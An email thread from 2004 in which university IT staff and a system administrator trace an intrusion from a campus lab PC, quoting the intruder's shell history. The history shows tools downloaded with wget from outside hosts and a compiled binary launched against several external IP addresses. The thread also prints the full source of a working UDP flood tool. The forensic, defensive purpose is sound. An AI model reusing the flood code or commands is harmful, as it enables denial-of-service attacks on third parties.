@@ -1,0 +1,424 @@
+From marcbell@unsw.edu.au Fri Feb 27 03:01:14 2004
+Date: Thu, 26 Feb 2004 15:37:04 +1100
+From: Marc Bell <marcbell@unsw.edu.au>
+To: UNSW Network Security Centre <network-abuse@explode.unsw.edu.au>
+Cc: predator@cat.org.au, Graham Low <G.Low@unsw.edu.au>,
+     Geoff Gordon <g.gordon@unsw.edu.au>, Cong Tran <congie@unsw.edu.au>,
+     Matthew Tolhurst <matthewt@unsw.edu.au>
+Subject: Re: (129.94.222.175) --- Machine with suspicious activity
+
+
+We got him.
+
+We've actually been tracking this guy for months since we suspected he was
+the one that hacked our labs and got our admin accounts last year. But we
+never had enough proof. But thanks to Predator (Mike? I think we know
+you?), we've nailed it down.
+
+We found the lab PC (.175) running IRC and a browser history full of
+proxies and SSH clients, but no person to be seen. The account had been
+logged in since about 9:30pm. As we were discussing this with our IT
+Director (Geoff Gordon), the accused actually came into the lab (we knew
+what he looked like from previous encounters), saw us standing around the
+machine, looked a bit worried, and turned to leave. Geoff called him over,
+and we had some interesting dialogue with the guy. He slipped out that he
+was running bots and sharing software, but insisted it was all a 'game'. In
+the end, we informed him that the PC is under investigation for a security
+breach, and then let him go. It was only after we got back to the office
+that we found Mike's email that pin pointed the time in which the accused
+was logged on to .175, and basically proves it all beyond doubt for us. We
+are currently obtaining security camera tapes to hopefully show him sitting
+at the PC at the time of the event.
+
+We've almost had him before, but I think we've got him this time. Thanks go
+to Mike for an email that's got us all very excited down here in the
+commerce lab technical support office!
+
+Regards,
+
+___________________________________
+
+Marc Bell
+Computer Systems Officer
+Technical Support Group
+Faculty of Commerce and Economics
+The University of New South Wales
+___________________________________
+
+
+                                                                                                                                              
+                      "UNSW Network Security                                                                                                  
+                      Centre"                         To:       techsupport@notesmta.commerce.unsw.edu.au                                     
+                      <network-abuse@explode.u        cc:       predator@cat.org.au                                                           
+                      nsw.edu.au>                     Subject:  (129.94.222.175) --- Machine with suspicious activity                         
+                                                                                                                                              
+                      26/02/2004 01:56 PM                                                                                                     
+                                                                                                                                              
+                                                                                                                                              
+
+
+
+
+The following machine has shown signs of suspicious activity that could
+include a compromised operating system/program and/or sharing data in a
+peer to peer environment that may breach copyright law.
+
+(129.94.222.175) --- VLAN125 - Goodsell Labs
+
+The Local Administrators for the machine listed are advised to check the
+aforementioned machine for signs of any suspicious activity. Local
+Administrators who own the aforementioned machine are advised to respond to
+network-abuse@explode.unsw.edu.au, including whether any signs of
+suspicious activity were present and any action taken.
+
+Any Local Administrator who fails to reply to
+network-abuse@explode.unsw.edu.au within 24 hours of receipt, may have that
+machine disconnected from the University Network until the suspicious
+activity is investigated.
+
+Any queries/ problems can be directed to network-abuse@explode.unsw.edu.au.
+The first available Senior Network Engineer will attend to your concerns.
+
+Senior Network Engineer
+Communications Unit
+University of New South Wales
+
+------------------------------------------
+
+---------- Forwarded message ----------
+Date: Thu, 26 Feb 2004 03:25:27 +1100 (EST)
+From: predator@cat.org.au
+To: catgeek@cat.org.au
+Cc: g.low@unsw.edu.au
+Subject: I\'ve been sniffed by a UNSW user! mine and rootpwd has changed
+
+
+
+I came here to cat.org.au tonight (12:30am 26 Feb) and noticed that there
+was LOTS of activity on the hub (as in, 10mbit full saturation). Conway
+was hellishly busy. I logged in at the tty and noticed this login from
+129.94.222.175 which resolves to somewhere in the UNSW Faculty of Commerce
+and Economics, probably to quad lab 3 or 4 on the first floor.
+
+
+My passwd has since been changed. Rootpwd on conway has also been changed.
+chkrootkit indicates nothing (yet).
+
+
+top indicated a process was eating lots of CPU and was running from my
+directory. Its name was hajar. It has been installed on the 19th of Feb at
+2:37am. It is accessible at:
+
+
+/home/predator/   /hajar\" and is 6267 bytes long.
+
+
+It\'s a binary executable. Execution permissions have now been removed and
+the file frozen. The executables were compiled on Feb 19.
+
+
+TCP ports open on the originating UNSW machine above are:
+25, 135, 139, 161, 162, 427, 445, 593, 1025, 4444, 5000
+
+
+Whoever this character is they left a lot of profile fingerprints in the
+.bash_history file, segments of which are presented below with
+commentaries:
+
+
+
+  166  logout     <-me logging off
+  167  w          <-him/her logged on, looking around
+  168  ps x       <- I never do ps x, always ps aux
+  169  w
+  170  df -h
+  171  whoami
+  172  mkdir
+  173  mkdir \"   \"  <--getting sneaky
+  174  cd \"   \"
+  175  wget http://www.psychoid.lam3rz.de/psyBNC2.3.1.tar.gz
+  176  tar zxvf psyBNC2.3.1.tar.gz
+  177  cd psybnc
+
+
+psyBNC is an mIRC bouncer, whatever that is (a relay?)
+
+
+Now this is interesting. I can\'t find a symlink but slocate finds psybnc
+unpacked in /home/catskills/.../psybnc ... la -lurt indicates fairly
+recent usage of most of it. This has also had x permissions removed
+and has been frozen too. Also note the username permissions... cam??
+
+
+total 748
+-rw-------    1 cam      cam          3756 Feb 22 12:09 targets.mak
+-rw-r--r--    1 cam      cam           854 Feb 22 12:09 salt.h
+-rw-r--r--    1 cam      cam           369 Feb 22 12:09 psybncchk
+-rw-------    1 cam      cam          1531 Feb 22 12:09 psybnc.conf
+-rw-r--r--    1 cam      cam          5992 Feb 22 12:09 makesalt
+-rw-r--r--    1 cam      cam           704 Feb 22 12:09 makefile.out
+-rw-------    1 cam      cam           783 Feb 22 12:09 config.h
+-rw-r--r--    1 cam      cam            76 Feb 22 12:09 TODO
+-rw-r--r--    1 cam      cam         36674 Feb 22 12:09 README
+-rw-r--r--    1 cam      cam          1347 Feb 22 12:09 Makefile
+-rw-r--r--    1 cam      cam          2660 Feb 22 12:09 FAQ
+-rw-------    1 cam      cam         17982 Feb 22 12:09 COPYING
+-rw-r--r--    1 cam      cam         19875 Feb 22 12:09 CHANGES
+-rw-------    1 cam      cam             6 Feb 22 12:09 psybnc.pid
+-rw-------    1 cam      cam          1558 Feb 22 12:09 psybnc.conf.old
+-rw-r--r--    1 cam      cam        589768 Feb 22 12:09 psybnc
+-rw-------    1 cam      cam           113 Feb 22 12:09 USER2.LOG.old
+-rw-------    1 cam      cam            56 Feb 22 12:09 USER2.LOG
+-rw-------    1 cam      cam           493 Feb 22 12:09 USER1.LOG
+drw-r--r--    2 cam      cam          4096 Feb 24 08:54 tools/
+drw-r--r--    2 cam      cam          4096 Feb 24 08:54 src/
+drw-r--r--    3 cam      cam          4096 Feb 24 08:54 scripts/
+drw-r--r--    2 cam      cam          4096 Feb 24 08:54 motd/
+drw-r--r--    3 cam      cam          4096 Feb 24 08:54 menuconf/
+drw-r--r--    2 cam      cam          4096 Feb 24 08:54 log/
+drw-r--r--    2 cam      cam          4096 Feb 24 08:54 help/
+-------------------
+
+
+See also /home/catskills/.../tare for (not listed here) a load of trawled
+IP numbers. Anyway the dude gets the tarball and compiles the contents
+
+
+  178  ls -al
+  179  make menuconfig
+  180  make menuconf/
+  181  make menuconf
+  182  make menuconfig
+  183  cd ..
+  184  cd ..
+  185  ls
+  186  ls -al
+  187  cd \"   \"
+  188  ls -al
+
+
+Then removes the directory and the tarball itself
+
+
+  189  rm psybnc
+  190  rm -rf psybnc
+  191  rm psyBNC2.3.1.tar.gz
+  192  wget http://www.geocities.com/cafetaiwan/tembak.c
+
+
+Interestingly enough this is still there. It\'s a text file, with C code in
+it. Here it is. Looking at the variable names whoever wrote it is
+linguistically fluent with Indonesian.
+
+
+------------
+#include <stdio.h>
+#include <sys/param.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <stdarg.h>
+#define JENIS_PELURU \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"
+#define UKURAN_PELURU 45
+
+
+int echo_connect(char *, short);
+int echo_connect(char *server, short port)
+{
+struct sockaddr_in sin;
+struct hostent *hp;
+int thesock;
+printf(\"\\n\");
+printf(\"Pasukan..!!!! Tembaaaak %s ke port %d\\n\",
+server, port);
+hp = gethostbyname(server);
+if (hp==NULL) {
+printf(\"Di %s gak ada sasaran, Boss!!\\n\",server);
+printf(\"\\n\");
+exit(0);
+}
+bzero((char*) &sin, sizeof(sin));
+bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
+sin.sin_family = hp->h_addrtype;
+sin.sin_port = htons(port);
+sin.sin_family = hp->h_addrtype;
+sin.sin_port = htons(port);
+thesock = socket(AF_INET, SOCK_DGRAM, 0);
+connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
+return thesock;
+}
+
+
+
+main(int argc, char **argv)
+{
+int s;
+if(argc != 3)
+{
+printf(\"\\n\");
+printf(\"Kirim Paket ke IP orang\\n\\n\");
+printf(\"Cara Pake : $ tembak hostname.orang port \\n\\n\");
+exit(0);
+}
+s=echo_connect(argv[1], atoi(argv[2]));
+for(;;)
+{
+send(s, JENIS_PELURU, UKURAN_PELURU, 0);
+}
+}
+
+
+
+They wrote it in July of 2002... or downloaded it to their directory in
+2002. Lots of other uh... interesting tools there. Anyway, what the dude
+does with his/her freshly compiled tool (note: probably doing CS, knows
+how to use gcc compiler) is go launch attacks on other machines with
+it. And read my mail. It\'s an exploit.
+
+
+
+  193  gcc -o hajar tembak.c
+  194  ls
+  195  w
+  196  ./hajar 80.144.184.19 51&
+  197  w
+  198  pine
+  199  pine
+  200  w
+  201  pine
+  202  pine
+  203  w
+  204  logout
+
+
+  248  logout
+  249  w
+  250  cd \"   \"
+  251  ps x
+  252  ls
+  253  w
+  254  w
+  255  ./hajar 202.159.50.17 51&
+  256  w
+  257  last
+  258  last | more
+  259  pine
+  260  ssh turing  <--- interesting. Checked out OK from .history. May be
+  me!
+  261  exit
+
+  310  ls -ld
+  311  ls -l
+  312  ls -la p*
+  313   | more
+  314  ls -la p* | more
+  315  w
+  316  w
+  317  cd \"   \"
+  318  ls
+  319  ./hajar 202.155.38.120 51&
+  320  w
+  321  pine
+  322  w
+  323  last | more
+  324  logout
+
+
+  361  cd \"   \"
+  362  w
+  363  ls
+  364  ./hajar 203.173.147.137 51&
+  365  w
+  366  pine
+  367  w
+  368  logout
+
+
+So here\'s me tonight:
+
+
+  500  logout
+  501  passwd       <-ahem!
+  502  last | more  <-who else has been on here lately?
+  503  sudo traceroute 129.94.222.175    <-- I know that machine.
+  504  pine
+  505  history | more
+  506  locate hajar
+  507  cd /hajar                          <--- ahh, the spaces!
+  508  cd \"/home/predator/   /hajar\"      <- it\'s not a directory its a
+  file.
+  509  ls -la \"/home/predator/   /hajar\"  <-characterise it
+  510  pine \"/home/predator/   /hajar\"    <--thinko
+  511  pico \"/home/predator/   /hajar\"    <-- read it. Executable. Yuk!
+  512  ls -la \"/home/predator/   /hajar\"
+  513  chmod -x \"/home/predator/   /hajar\" <--- stop its execution.
+  514  ls -la \"/home/predator/   /hajar\"   <-- check
+  515  chattr +i \"/home/predator/   /hajar\"<--freeze it
+  516  lsattr \"/home/predator/   /hajar\"   <--heck frozen
+  517  cd public_html/
+  518  ls
+  519  ls -lart GENC5001* > lart.txt      <--check these havent been
+  520  ls -lart GENC5001*                 <-- messed with
+  521  history
+  522  history
+  523  history | more
+  524  history > history.txt              <---interesting footprints!
+
+
+ ---------------
+
+
+Access dates (time/datestamp on conway is accurate) of interest from this
+UNSW terminal are :
+
+
+
+predator pts/4        129.94.222.175   Thu Feb 26 00:26 - 00:43  (00:16)
+(this morning, I chopped their session off at 00:43)
+
+
+predator pts/0        129.94.222.175   Sat Feb 21 13:29 - 13:47  (00:18)
+predator pts/0        129.94.222.175   Fri Feb 20 16:41 - 16:59  (00:18)
+predator pts/0        129.94.222.175   Fri Feb 20 16:10 - 16:10  (00:00)
+predator pts/1        129.94.222.175   Thu Feb 19 18:56 - 21:24  (02:27)
+
+
+and... check out those timestamps! Whoever they are has after-hours and
+weekend access... possibly remotely.
+
+
+I think it\'s reasonable to assume that whoever is/was doing this will show
+up today (thurs, 26 Feb) and sit down at exactly the same machine, and
+attempt to log in (which will show in our logs) to figure out why their
+remotely installed IRC relay (?) isn\'t working any more. It\'s also likely
+that whoever they are, they obtained my username/password via, say, a
+sniffer which remains installed on the UNSW machine in question (to which
+they return many times). Maybe they saw me type it in, which suggests a
+student of GENC5001. Maybe, their name is Hajar (not super-likely but
+anyway).  Additionally it\'s likely whoever this is, is not only attacking
+my system. In any case, all these other places they attack are probably
+going to have UNSW IP numbers showing up in their logs as well as our IP
+numbers.
+
+
+Anyway, its 3:30 am and I need sleep now. If other geeks want to poke
+around and suss out the system, you have my encouragement.
+
+
+-------
+
+
+Thanks Tim. I\'ll be away from the terminal for a while, but I should be
+able to answer further questions later. If you have specific logfiles you
+want to look at, name \'em and I\'ll send \'em off.
+
+
+
+Cheeries...
+
+
+<predator>
+
+
+
+
